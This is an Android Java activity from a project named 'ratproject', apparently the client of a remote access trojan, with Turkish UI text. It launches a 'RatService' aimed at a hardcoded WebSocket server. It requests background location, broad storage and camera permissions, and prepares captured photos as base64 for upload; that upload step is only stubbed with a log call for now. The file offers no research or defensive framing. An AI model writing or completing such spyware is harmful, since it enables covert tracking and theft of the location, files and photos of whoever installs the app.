package com.example.ratproject;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import java.io.ByteArrayOutputStream;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.ratproject.services.RatService;

public class MainActivity extends AppCompatActivity {
    private TextView statusText;
    private Button connectButton;
    private Button startServiceButton;
    private Button cameraButton;

    private static final int PERMISSION_REQUEST = 100;
    private static final int CAMERA_REQUEST = 200;
    private static final String TAG = "MainActivity";

    private static final String SERVER_URL = "ws://192.168.1.5:8080";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        connectButton = findViewById(R.id.connectButton);
        startServiceButton = findViewById(R.id.startServiceButton);
        cameraButton = findViewById(R.id.cameraButton);

        connectButton.setOnClickListener(v -> {
            Intent intent = new Intent(this, RatService.class);
            intent.putExtra("server_url", SERVER_URL);
            startService(intent);
            statusText.setText("Service Started");
        });

        startServiceButton.setOnClickListener(v -> {
            Intent intent = new Intent(this, RatService.class);
            stopService(intent);
            statusText.setText("Service Stopped");
        });

        cameraButton.setOnClickListener(v -> {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
                == PackageManager.PERMISSION_GRANTED) {
                openCamera();
            } else {
                Toast.makeText(this, "Kamera izni gerekli", Toast.LENGTH_SHORT).show();
                requestPermissions();
            }
        });

        requestPermissions();
    }

    private void requestPermissions() {
        String[] permissions;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ permissions
            permissions = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                "android.permission.READ_MEDIA_IMAGES",
                "android.permission.READ_MEDIA_VIDEO",
                Manifest.permission.CAMERA
            };
        } else {
            // Older Android versions
            permissions = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA
            };
        }

        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void openCamera() {
        Intent cameraIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (cameraIntent.resolveActivity(getPackageManager()) != null) {
            startActivityForResult(cameraIntent, CAMERA_REQUEST);
        } else {
            Toast.makeText(this, "Kamera uygulaması bulunamadı", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == CAMERA_REQUEST && resultCode == RESULT_OK) {
            if (data != null && data.getExtras() != null) {
                Bitmap photo = (Bitmap) data.getExtras().get("data");
                if (photo != null) {
                    // Convert to base64 and send to server
                    String base64Image = bitmapToBase64(photo);
                    sendPhotoToServer(base64Image);
                    statusText.setText("Fotoğraf çekildi ve gönderildi!");
                }
            }
        }
    }

    private String bitmapToBase64(Bitmap bitmap) {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream);
        byte[] imageBytes = outputStream.toByteArray();
        return Base64.encodeToString(imageBytes, Base64.DEFAULT);
    }

    private void sendPhotoToServer(String base64Image) {
        // Bu fonksiyonu RatService ile iletişim kuracak şekilde geliştirebiliriz
        // Şimdilik log'a yazdırıyoruz
        Log.i(TAG, "Photo captured and converted to base64, length: " + base64Image.length());
        Toast.makeText(this, "Fotoğraf base64 formatında hazır!", Toast.LENGTH_SHORT).show();
    }
}